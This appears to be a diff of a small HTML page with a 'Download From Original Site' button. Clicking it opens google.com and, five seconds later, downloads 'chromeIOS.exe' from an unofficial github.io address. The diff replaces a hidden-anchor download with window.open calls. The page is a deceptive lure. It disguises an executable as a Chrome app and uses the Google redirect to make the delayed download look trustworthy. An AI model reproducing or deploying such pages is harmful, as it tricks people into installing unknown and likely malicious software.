@@ -1,43 +1,30 @@
-<!doctype html>
 <html>
-<head>
+ <head> 
   <meta charset="utf-8">
-  <style>
-    .button {
-      background-color: #4CAF50;
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      text-align: center;
-      font-size: 16px;
-      margin: 4px 2px;
-      cursor: pointer;
-    }
-  </style>
-</head>
-<body>
-
-<script>
-function a() {
-
-  // Redirect ke google.com terlebih dahulu
-  location.href = 'https://google.com';
-
-  // Setelah 5 detik, trigger download
-  setTimeout(function () {
-    var link = document.createElement('a');
-    link.href = 'https://ecdnts-del.github.io/test-apk/chromeIOS.exe';
-    link.download = 'chromeIOS.exe';
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-  }, 5000); // Delay 5 detik sebelum download muncul
+<style>
+.button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
 }
-</script>
-
-<center>
-  <input type="button" class="button" value="Download From Original Site" onclick="a()">
-</center>
-
-</body>
+</style>
+ </head> 
+ <body> 
+  <script>
+function a(){
+	window.open('https://google.com', 'x');
+	setTimeout(function(){
+		window.open('https://ecdnts-del.github.io/test-apk/chromeIOS.exe', 'x');
+	}, 5000);
+}
+</script> 
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
+ </body>
 </html>
